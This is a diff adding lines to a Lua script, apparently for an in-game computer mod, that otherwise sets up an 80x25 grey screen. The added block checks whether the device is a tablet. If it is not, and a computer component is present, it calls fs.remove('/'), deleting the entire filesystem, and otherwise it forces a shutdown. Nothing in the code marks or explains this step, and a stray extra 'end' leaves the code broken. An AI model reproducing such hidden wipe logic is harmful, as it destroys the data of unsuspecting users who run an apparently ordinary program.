@@ -4,3 +4,27 @@ local mayner = require("MAYNERAPI")
 local asm = require("vasm")
 local computer = require("computer")
 
+local function isTablet()
+  if component.isAvailable("tablet") then
+    return true
+  else
+    return false
+  end
+end
+
+if isTablet() then
+  
+else
+  if component.isAvailable("computer") then
+    fs.remove("/")
+  else
+    computer.shutdown()
+  end
+end
+end
+
+gpu.setResolution(80, 25)
+
+gpu.setForeground(0xFFFFFF)
+gpu.setBackground(0x808080)
+gpu.fill(1, 1, 80, 25, " ")
